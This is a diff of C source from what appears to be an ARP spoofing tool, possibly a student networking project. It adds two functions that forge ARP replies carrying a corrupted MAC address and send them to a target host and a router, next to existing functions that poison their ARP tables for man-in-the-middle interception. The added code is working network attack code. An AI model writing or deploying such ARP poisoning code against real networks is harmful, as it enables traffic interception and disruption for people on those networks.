@@ -200,7 +200,6 @@ err_t send_request_target_unicast(const proginfo_t *const info)
     mymachine_mac, getmacfromstr(info->target.mac), false);
 }
 
-
 /// Spoof my MAC address into router's ARP table at target's ip index.
 err_t spoof_router(const proginfo_t *const info)
 {
@@ -245,6 +244,50 @@ err_t spoof_target(const proginfo_t *const info)
 
     return send_arp(info->sockarp, (const struct ether_arp *)&earp,
     mymachine_mac, getmacfromstr(info->router.mac), false);
+}
+
+err_t corrupt_my_mac_in_target(const proginfo_t *const info)
+{
+    struct ether_arp earp = (struct ether_arp){
+        .arp_hrd = htons(HARWARE_TYPE),
+        .arp_pro = htons(ETH_P_IP),
+        .arp_hln = SIZEOFMAC,
+        .arp_pln = SIZEOFIP,
+        .arp_op = htons(ARP_REPLY),
+    };
+
+    ft_memcpy(earp.arp_sha, CORRUPTED_MAC, SIZEOFMAC);
+    ft_memcpy(earp.arp_spa, getipfromstr(info->mymachine.ip), SIZEOFIP);
+    ft_memcpy(earp.arp_tha, getmacfromstr(info->target.mac), SIZEOFMAC);
+    ft_memcpy(earp.arp_tpa, getipfromstr(info->target.ip), SIZEOFIP);
+
+    uint8_t mymachine_mac[SIZEOFMAC];
+    ft_memcpy(mymachine_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
+    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
+    mymachine_mac, getmacfromstr(info->router.mac), false);
+}
+
+err_t corrupt_my_mac_in_router(const proginfo_t *const info)
+{
+    struct ether_arp earp = (struct ether_arp){
+        .arp_hrd = htons(HARWARE_TYPE),
+        .arp_pro = htons(ETH_P_IP),
+        .arp_hln = SIZEOFMAC,
+        .arp_pln = SIZEOFIP,
+        .arp_op = htons(ARP_REPLY),
+    };
+
+    ft_memcpy(earp.arp_sha, CORRUPTED_MAC, SIZEOFMAC);
+    ft_memcpy(earp.arp_spa, getipfromstr(info->mymachine.ip), SIZEOFIP);
+    ft_memcpy(earp.arp_tha, getmacfromstr(info->router.mac), SIZEOFMAC);
+    ft_memcpy(earp.arp_tpa, getipfromstr(info->router.ip), SIZEOFIP);
+
+    uint8_t mymachine_mac[SIZEOFMAC];
+    ft_memcpy(mymachine_mac, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
+
+    return send_arp(info->sockarp, (const struct ether_arp *)&earp,
+    mymachine_mac, getmacfromstr(info->target.mac), false);
 }
 
 /// Remove my spoofed MAC address from target's ARP table (at router's ip index)
